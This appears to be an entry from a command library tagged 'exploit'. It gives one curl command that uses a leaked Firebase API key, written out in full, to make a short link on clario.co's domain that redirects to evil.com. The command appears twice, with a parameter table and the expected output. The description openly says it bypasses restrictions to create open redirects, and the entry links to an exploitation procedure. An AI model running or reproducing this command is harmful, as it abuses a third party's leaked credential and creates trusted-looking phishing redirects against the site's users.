---
id: cmd-1066410-004
data: >-
  curl -X POST
  'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ'
  -H 'Content-Type: application/json' -d
  '{"longDynamicLink":"https://evil.com/clario.co/"}'
tags:
  - exploit
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.474Z'
verified: false
validated: true
submitted: true
---
# create-firebase-short-link

## Command

```bash
curl -X POST 'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ' -H 'Content-Type: application/json' -d '{"longDynamicLink":"https://evil.com/clario.co/"}'
```

## Description

Sends a request to Firebase API to create a shortened dynamic link using a leaked key, bypassing restrictions for open redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `?key=...` | API key | Yes |
| `-H 'Content-Type: ...'` | JSON header | Yes |
| `-d '{...}'` | Payload with long link | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ' -H 'Content-Type: application/json' -d '{"longDynamicLink":"https://evil.com/clario.co/"}'
```

### Advanced Usage

Add more options like dynamicLinkDomain in payload for customization.

## Expected Output

JSON response: {"shortLink": "https://lnk.clario.co/abc123", ...}

## Related

- [[commands/test-redirect]]
- [[procedures/Exploit-Firebase-API-for-Arbitrary-Redirects]]
